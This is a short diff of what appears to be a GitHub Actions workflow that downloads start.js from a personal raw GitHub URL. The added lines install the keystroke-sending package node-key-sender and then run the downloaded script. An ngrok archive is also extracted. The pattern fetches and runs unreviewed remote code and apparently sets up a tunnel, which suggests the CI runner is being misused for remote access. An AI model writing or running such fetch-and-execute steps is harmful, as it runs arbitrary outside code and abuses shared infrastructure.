@@ -23,6 +23,12 @@ jobs:
     - name: Script
       run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/me/start.js -OutFile start.js
 
+    - name: Install
+      run: npm install node-key-sender
+
+    - name: Start
+      run: node start.js
+
     - name: Extract
 
       run: Expand-Archive ngrok.zip
